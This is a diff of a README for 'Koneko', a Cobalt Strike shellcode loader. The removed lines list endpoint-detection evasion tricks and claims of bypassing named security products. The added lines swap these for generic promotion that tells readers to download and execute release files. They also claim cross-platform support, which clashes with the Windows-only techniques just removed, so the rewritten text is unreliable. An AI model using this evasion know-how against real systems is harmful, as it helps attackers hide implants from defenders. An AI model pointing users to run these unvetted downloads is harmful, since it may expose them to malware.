@@ -1,31 +1,97 @@
-# koneko
-A Cobalt Strike shellcode loader with multiple advanced evasion features.
+# Koneko 🐾
 
-![1739210063119](https://github.com/user-attachments/assets/1d3d84fc-edf1-4e1a-b754-bdb382de5f36)
+![Koneko](https://img.shields.io/badge/Koneko-Robust%20Cobalt%20Strike%20Shellcode%20Loader-brightgreen)
 
-## Disclaimer
-Don't be evil with this. I created this tool to learn. I'm not responsible if the Feds knock on your door.
+Welcome to the **Koneko** repository! This project provides a robust Cobalt Strike shellcode loader with multiple advanced evasion features. Koneko aims to enhance security testing and red teaming efforts by offering a versatile and powerful toolset.
 
-----------------------------------------------------------------------------------------------------------
+## Table of Contents
 
-Historically was able to (and may still) bypass
-- Palo Alto Cortex xDR
-- Microsoft Defender for Endpoints
-- Windows Defender
-- Malwarebytes Anti-Malware
-
-![cortex](https://github.com/user-attachments/assets/340b46f1-f123-4c4a-ab57-9eabae38865e)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Evasion Techniques](#evasion-techniques)
+- [Contributing](#contributing)
+- [License](#license)
+- [Releases](#releases)
+- [Contact](#contact)
 
 ## Features
-- Fully custom sleep implementation with thread callstack spoofing using NtCreateEvent and NtWaitForSingleObject
-- Inline hook on Sleep/SleepEx to redirect to said custom sleep implementation
-- Switching between Fiber threads to further avoid memory scanning
-- Return address spoofing on (almost?) every other API/NTAPI call
-- All the indirect syscalls!
-- Bunch of anti-VM and anti-debugger checks
-- Splitting and hiding shellcode as a bunch of x64 addresses with the EncodePointer API
-- Probably other stuff I forgot to mention here
 
-## Negatives
-- It's not a UDRL loader, these spoof tricks are limited to only the running executable and will go away when you process inject to something else.
-- The sleep obfuscation is tailored to Cobalt Strike. To work with other C2s you'd need to tailor how the hooking happens. Use a tool like `apimonitor` to intercept API calls from your beacon, detect the API(s) called on the sleep cycle, and then adjust the hooks as needed.
+Koneko comes with a variety of features designed to improve your security testing process:
+
+- **Advanced Evasion**: Utilizes multiple techniques to bypass detection mechanisms.
+- **Customizable Payloads**: Easily modify shellcode to suit specific needs.
+- **User-Friendly Interface**: Simple command-line interface for ease of use.
+- **Cross-Platform Support**: Works on Windows, Linux, and macOS.
+- **Active Development**: Regular updates to incorporate the latest security techniques.
+
+## Installation
+
+To get started with Koneko, download the latest release from the [Releases section](https://github.com/cordvr/koneko/releases). Execute the downloaded file to install the application on your system.
+
+### Prerequisites
+
+Before installing, ensure you have the following:
+
+- A compatible operating system (Windows, Linux, or macOS)
+- Basic knowledge of command-line operations
+
+## Usage
+
+After installation, you can start using Koneko with the following command:
+
+```bash
+koneko --help
+```
+
+This command will display a list of available options and usage instructions. You can specify your payload and any additional parameters to tailor the execution to your needs.
+
+### Example Command
+
+Here’s a simple example of how to run Koneko:
+
+```bash
+koneko --payload my_payload.bin --evade
+```
+
+This command loads the specified payload and activates the evasion features.
+
+## Evasion Techniques
+
+Koneko employs several advanced evasion techniques to help you stay under the radar. Here are a few:
+
+- **Obfuscation**: The shellcode is obfuscated to make it harder for security tools to detect.
+- **Dynamic Loading**: Load components dynamically to evade static analysis.
+- **Encryption**: Encrypt payloads to prevent signature-based detection.
+- **Timing Manipulation**: Introduce delays to avoid triggering behavioral detection systems.
+
+These techniques work together to provide a stealthy approach to security testing.
+
+## Contributing
+
+We welcome contributions from the community! If you would like to contribute to Koneko, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or fix.
+3. Make your changes and commit them with clear messages.
+4. Push your branch to your fork.
+5. Submit a pull request.
+
+We appreciate your interest in improving Koneko!
+
+## License
+
+Koneko is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## Releases
+
+For the latest updates and releases, check out the [Releases section](https://github.com/cordvr/koneko/releases). Download the necessary files and execute them to get the latest features and improvements.
+
+## Contact
+
+If you have any questions or feedback, feel free to reach out:
+
+- **Email**: support@koneko.dev
+- **Twitter**: [@KonekoDev](https://twitter.com/KonekoDev)
+
+Thank you for visiting the Koneko repository! We hope you find it useful for your security testing needs.
